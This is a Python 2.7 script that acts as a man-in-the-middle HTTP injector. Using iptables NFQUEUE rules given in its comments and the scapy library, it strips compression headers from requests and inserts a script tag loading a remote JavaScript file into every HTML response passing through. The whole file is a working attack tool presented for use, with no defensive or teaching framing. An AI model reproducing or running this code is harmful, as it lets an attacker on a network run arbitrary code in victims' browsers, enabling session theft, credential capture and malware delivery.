#!/usr/bin/python2.7
#works only on http clear all the cache in the browser
#commands to run on terminal befor running the scripts these create a queue to packet to modify
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I FORWARD -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy.all as scapy
import re
import argparse

target_file = None

def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--code", dest="code", help="Path of hosted javascript file")
    options = parser.parse_args()
    if not options.code:
        parser.error("[-]Please specify code to inject")
    return options



#to create a modified packet
def set_load(packet,load):
    packet[scapy.Raw].load=load
    if "alert('test')" in packet[scapy.Raw].load:
        print "JavaScript Injected Successfully"
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):

    scapy_packet=scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        load=scapy_packet[scapy.Raw].load

        if scapy_packet[scapy.TCP].dport == 80:
            #print "[+]Request "
            load = re.sub("Accept-Encoding:.*?\\r\\n", "",load)
            #set the encoding to null

        elif scapy_packet[scapy.TCP].sport == 80:
            #print "[+] Response "
            #injection_code="<script>alert('test');</script>"
            global target_file
            injection_code="<script src = '"+target_file+"'></script>"
            load=load.replace("</body>",injection_code+"</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
            #get packet content length to recalculate with injection_code and replace with new content code

            if content_length_search and "text/html" in load:
                content_length=content_length_search.group(1)
                new_content_length=int(content_length)+len(injection_code)
                load = load.replace(content_length,str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet=set_load(scapy_packet,load)
            packet.set_payload(str(new_packet))

    packet.accept()

    
options = get_argument()
target_file = options.code
if not "http://" in target_file:
    target_file = "http://"+target_file
    
try:
    queue=netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[*] Detected CTRL + C ....... Quitting.")